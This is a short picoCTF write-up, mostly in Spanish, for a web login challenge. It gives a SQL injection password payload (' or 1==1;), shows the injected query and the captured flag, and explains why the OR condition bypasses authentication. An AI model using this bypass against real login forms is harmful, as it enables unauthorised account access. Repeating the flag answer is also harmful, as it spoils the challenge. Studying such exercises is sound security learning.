
#### Description

Do you think you can log us in? Try to see if you can login! http://fickle-tempest.picoctf.net:59137.

**Solución**

```

username: admin
password: ' or 1==1;
SQL query: SELECT * FROM users WHERE name='admin' AND password='' or 1==1;'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_85832275}

```

**Notas adicionales**

-  Lo que se realizo para poder resolver el ejercicio fue una Inyección SQL. Que básicamente concite en engañar a la base de datos para que nos diera acceso sin conocer la contraseña real.
- Al momento de hacer la inyección en la lógica de programación, una sentencia `FALSO OR VERDADERO` siempre resulta en **VERDADERO**. Como la condición se cumple para cualquier registro (o al menos para el primero que encuentre), el sistema asume que la autenticación fue exitosa y te deja pasar como administrador.


**Referencias**

- https://www.w3schools.com/sql/sql_injection.asp